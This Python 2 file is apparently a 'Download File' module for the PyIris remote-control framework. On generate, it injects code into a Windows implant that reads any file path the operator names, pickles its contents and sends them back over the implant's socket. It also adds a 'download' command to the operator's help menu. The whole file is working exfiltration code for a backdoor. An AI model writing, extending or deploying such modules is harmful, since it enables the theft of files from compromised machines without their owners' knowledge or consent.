
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from pickle import dumps')
        config.functions.append('''
def download(data):
    filepath = data.split(' ',1)[1]
    f = open(filepath,'rb')
    file_data = f.read()
    pickled_data = dumps([filepath,file_data])
    s.sendall(pickled_data)''')
        config.logics.append('''
            elif command == "download":
                download(data)''')
        config.help_menu['download <Remote file path>'] = 'Remotely download a file to local current working directory of PyIris'
    elif option == 'info':
        print '\nName             : Download File component' \
              '\nOS               : Windows' \
              '\nRequired Modules : pickle' \
              '\nCommands         : download <Remote file path>' \
              '\nDescription      : Remotely download a file to local current working directory of PyIris\n'
